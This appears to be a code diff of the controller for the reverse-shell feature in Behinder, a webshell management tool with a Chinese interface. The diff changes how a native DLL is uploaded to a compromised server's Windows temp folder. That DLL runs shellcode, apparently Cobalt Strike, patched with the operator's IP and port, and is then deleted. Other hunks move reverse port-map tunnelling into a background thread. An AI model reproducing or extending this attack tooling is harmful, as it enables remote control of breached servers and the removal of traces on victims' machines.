@@ -9,6 +9,7 @@ import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
 import javafx.application.Platform;
 import javafx.beans.value.ChangeListener;
 import javafx.beans.value.ObservableValue;
@@ -139,7 +140,7 @@ public class ReverseViewController {
                         isPortMapTunnel = true;
                      }
 
-                     final Boolean finalIsPortMapTunnel = isPortMapTunnel;
+                     final boolean finalIsPortMapTunnel = isPortMapTunnel;
                      Platform.runLater(() -> {
                         if (finalIsPortMapTunnel) {
                            this.reverseButton.setText("关闭");
@@ -165,6 +166,7 @@ public class ReverseViewController {
                            return;
                         }
 
+                        String remoteUploadPath = "c:/windows/temp/" + Utils.getRandomString((new Random()).nextInt(10)) + ".log";
                         if (this.shellEntity.getString("type").equals("jsp")) {
                            short portByteIndex;
                            byte[] nativeLibraryFileContent;
@@ -172,14 +174,16 @@ public class ReverseViewController {
                            int num;
                            if (((String)this.basicInfoMap.get("arch")).toString().indexOf("64") >= 0) {
                               portByteIndex = 274;
-                              nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
+                              nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x64.dll");
                               payloadFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/shellcode/cs.payload.64");
                               num = Integer.parseInt(targetPort);
                               payloadFileContent[portByteIndex] = (byte)(num & 255);
                               payloadFileContent[portByteIndex + 1] = (byte)((num & '\uff00') >> 8);
                               payloadFileContent = Utils.mergeBytes(payloadFileContent, actualTargetIP.getBytes());
                               payloadFileContent = Utils.mergeBytes(payloadFileContent, new byte[]{0, 0, 0, 0, 0});
-                              resultObj = this.currentShellService.loadLibraryAndexecutePayload(Base64.getEncoder().encodeToString(nativeLibraryFileContent), Base64.getEncoder().encodeToString(payloadFileContent));
+                              this.currentShellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
+                              resultObj = this.currentShellService.executePayload(remoteUploadPath, Base64.getEncoder().encodeToString(payloadFileContent));
+                              this.currentShellService.deleteFile(remoteUploadPath);
                            } else {
                               portByteIndex = 196;
                               nativeLibraryFileContent = Utils.getResourceData("net/rebeyond/behinder/resource/native/JavaNative_x32.dll");
@@ -189,15 +193,17 @@ public class ReverseViewController {
                               payloadFileContent[portByteIndex + 1] = (byte)((num & '\uff00') >> 8);
                               payloadFileContent = Utils.mergeBytes(payloadFileContent, actualTargetIP.getBytes());
                               payloadFileContent = Utils.mergeBytes(payloadFileContent, new byte[]{0, 0, 0, 0, 0});
-                              resultObj = this.currentShellService.loadLibraryAndexecutePayload(Base64.getEncoder().encodeToString(nativeLibraryFileContent), Base64.getEncoder().encodeToString(payloadFileContent));
+                              this.currentShellService.uploadFile(remoteUploadPath, nativeLibraryFileContent, true);
+                              resultObj = this.currentShellService.executePayload(remoteUploadPath, Base64.getEncoder().encodeToString(payloadFileContent));
+                              this.currentShellService.deleteFile(remoteUploadPath);
                            }
                         } else if (this.shellEntity.getString("type").equals("aspx")) {
                            resultObj = this.currentShellService.connectBack(type, actualTargetIP, targetPort);
                            String status = resultObj.getString("status");
                            if (status.equals("fail")) {
-                              JSONObject finalResultObj = resultObj;
+                              final JSONObject fianlResultObj = resultObj;
                               Platform.runLater(() -> {
-                                 String msg = finalResultObj.getString("msg");
+                                 String msg = fianlResultObj.getString("msg");
                                  this.statusLabel.setText("反弹失败:" + msg);
                               });
                            } else {
@@ -213,7 +219,7 @@ public class ReverseViewController {
 
                      statusx = resultObj.getString("status");
                      if (statusx.equals("fail")) {
-                        JSONObject finalResultObj = resultObj;
+                        final JSONObject finalResultObj = resultObj;
                         Platform.runLater(() -> {
                            String msg = finalResultObj.getString("msg");
                            this.statusLabel.setText("反弹失败:" + msg);
@@ -223,9 +229,9 @@ public class ReverseViewController {
                            this.statusLabel.setText("反弹成功。");
                         });
                      }
-                  } catch (Exception var15) {
+                  } catch (Exception var16) {
                      Platform.runLater(() -> {
-                        this.statusLabel.setText("操作失败:" + var15.getMessage());
+                        this.statusLabel.setText("操作失败:" + var16.getMessage());
                      });
                   }
 
@@ -281,7 +287,18 @@ public class ReverseViewController {
    private void startReversePortMap(String listenIP, String listenPort) {
       Runnable worker = () -> {
          try {
-            JSONObject result = this.currentShellService.createReversePortMap(listenPort);
+            JSONObject result = new JSONObject();
+            result.put("status", (Object)"success");
+            Runnable backgroudRunner = () -> {
+               try {
+                  this.currentShellService.createReversePortMap(listenPort);
+               } catch (Exception var3) {
+                  var3.printStackTrace();
+               }
+
+            };
+            (new Thread(backgroudRunner)).start();
+            Thread.sleep(2000L);
             if (result.get("status").equals("success")) {
                result = this.currentShellService.listReversePortMap();
                Map paramMap = new HashMap();
@@ -301,9 +318,9 @@ public class ReverseViewController {
                   this.statusLabel.setText("通信隧道创建失败：" + msg);
                });
             }
-         } catch (Exception var7) {
+         } catch (Exception var8) {
             Platform.runLater(() -> {
-               this.statusLabel.setText("通信隧道创建失败：" + var7.getMessage());
+               this.statusLabel.setText("通信隧道创建失败：" + var8.getMessage());
             });
          }
 
@@ -383,6 +400,7 @@ public class ReverseViewController {
 
                   Thread.sleep(3000L);
                } catch (Exception var18) {
+                  var18.printStackTrace();
                   break;
                }
             }
